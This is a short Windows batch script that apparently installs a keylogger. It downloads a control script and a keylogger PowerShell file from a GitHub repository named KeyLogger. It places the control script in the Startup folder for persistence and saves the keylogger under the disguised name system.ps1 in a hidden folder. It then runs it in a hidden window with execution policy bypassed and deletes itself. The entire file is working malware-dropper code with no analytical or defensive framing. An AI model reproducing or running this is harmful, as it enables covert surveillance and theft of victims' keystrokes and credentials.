@echo off
set initial=cd
set start_up="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set name=%username%

cd %start_up%
powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/KeyLogger/main/control.cmd' -OutFile 'control.cmd'"
cd C:\Users\%name%
mkdir script
cd script
powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/KeyLogger/main/keylogger.ps1' -OutFile 'system.ps1'"
attrib +h C:\Users\%name%\script
cd %start_up%
start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass .\control.cmd

cd %initial%
del initial.cmd
